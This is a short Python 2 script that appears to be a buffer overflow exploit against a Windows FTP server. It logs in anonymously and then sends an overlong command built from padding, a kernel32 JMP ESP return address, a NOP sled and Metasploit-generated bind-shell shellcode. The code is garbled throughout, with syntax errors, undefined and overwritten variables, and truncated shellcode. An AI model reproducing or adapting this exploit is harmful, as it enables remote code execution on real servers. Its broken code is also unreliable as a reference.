#AUTHER: Yale
#DATE: 2017/02/13


import socket,sys,time,struct
if len(sys.argv) < 2:
    print "[-]Usage:%s <target addr> <command>"% sys.argv[0] + "\r"
    print "[-]For example [filename.py 192.168.1.1 PWND] would do the trick"
    print "[-]Other options:AUTH,APPE,ALLO,ACCT"
    sys.exit(0)
target = sys.argv[1]
target = sys.argv[2]
if len(sys.argv) > 2;
    platform = sys.argvp[2]

#./msdpayload windows/shell_bind_tcp -r | ./msfencode -e x86/shikata_ga_nai -b "\x00\xff...

shellcode = ("\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9"
"xb1\x56\x83\xc5\x04\x31\x7d\0f...."
             ".")
#7C874413 FFE4 JMP SEP kernel132.dll
ret = struct.pack('<L',0x7C874413)
padding = "\x90" * 150
crash = "\41" * 246 +ret+padding+shellcode
print "\"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((target,21))
except:
    print "[-] Connection to "+target9"failed"
    sys.exit(0)
print "[*]Sending "+'len(crash)'+ " "+command + "byte crash..."
s.send("USER anonymous \r\n")
s.recv(1024)
s.send("PASS \r\n")
s.recv(1024)
s.send(command+" "+crash+"\r\n")
time.sleep()